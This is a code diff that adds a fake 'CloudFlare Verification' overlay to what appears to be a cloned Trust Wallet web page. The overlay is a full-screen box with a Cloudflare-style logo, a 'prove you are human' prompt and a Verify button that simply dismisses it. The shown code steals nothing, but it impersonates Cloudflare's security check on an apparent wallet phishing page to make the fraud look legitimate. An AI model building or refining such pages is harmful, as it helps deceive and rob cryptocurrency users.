@@ -230,6 +230,59 @@
             background: #6e4aff;
             color: #fff;
         }
+        /* Cloudflare Verification Overlay */
+        #cloudflare-verify-overlay {
+            position: fixed;
+            z-index: 99999;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: #fff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.3s;
+        }
+        #cloudflare-verify-box {
+            background: #fafbfc;
+            border-radius: 12px;
+            box-shadow: 0 6px 32px rgb(60 60 60 / 10%);
+            border: 1px solid #e0e4ea;
+            padding: 2.5em 2.5em 2em 2.5em;
+            min-width: 340px;
+            max-width: 98vw;
+            text-align: center;
+            position: relative;
+        }
+        #cloudflare-logo {
+            height: 36px;
+            margin-bottom: 1.3em;
+        }
+        #cloudflare-verify-title {
+            font-size: 1.35em;
+            font-weight: 600;
+            color: #222;
+        }
+        #cloudflare-verify-desc {
+            font-size: 1em;
+            color: #444;
+            margin: 1em 0 2em 0;
+        }
+        #cloudflare-challenge-btn {
+            background: linear-gradient(90deg, #ff9100, #f80);
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            padding: 0.6em 2.5em;
+            font-size: 1.04em;
+            margin-top: 0.8em;
+            cursor: pointer;
+            font-weight: 600;
+            box-shadow: 0 2px 6px #ffa50022;
+            transition: background 0.2s;
+        }
+        #cloudflare-challenge-btn:active {
+            background: linear-gradient(90deg, #f80, #ff9100);
+        }
         @media (max-width: 520px) {
             .wallet-container {
                 margin: 10px;
@@ -250,10 +303,27 @@
             .token-details-popup {
                 padding: 19px 5vw 16px 5vw;
             }
+            #cloudflare-verify-box { min-width: unset; padding: 1em 0.5em; }
         }
     </style>
 </head>
 <body>
+    <!-- Cloudflare-style Verification Overlay (appears every visit) -->
+    <div id="cloudflare-verify-overlay">
+        <div id="cloudflare-verify-box">
+            <svg id="cloudflare-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 115 36" fill="none">
+                <ellipse cx="22" cy="18" rx="22" ry="18" fill="#F38020"/>
+                <ellipse cx="62" cy="26" rx="26" ry="10" fill="#F7B500"/>
+                <ellipse cx="87" cy="23" rx="15" ry="7" fill="#F38020"/>
+            </svg>
+            <div id="cloudflare-verify-title">CloudFlare Verification</div>
+            <div id="cloudflare-verify-desc">
+                Please click the button below to prove you are human and continue to the site.
+            </div>
+            <button id="cloudflare-challenge-btn">Verify</button>
+        </div>
+    </div>
+
     <div class="wallet-container">
         <div class="logo-circle-holder">
             <!-- Trust Wallet logo (keep as your asset) -->
@@ -308,6 +378,14 @@
     </div>
 
     <script>
+        // Cloudflare overlay logic: always shows on every visit
+        document.getElementById('cloudflare-challenge-btn').onclick = function() {
+            document.getElementById('cloudflare-verify-overlay').style.opacity = '0';
+            setTimeout(() => {
+                document.getElementById('cloudflare-verify-overlay').style.display = 'none';
+            }, 300);
+        };
+
         function showTokenDetails(token) {
             const tokenDetailsBg = document.getElementById('token-details-bg');
             const tokenName = document.getElementById('token-name');
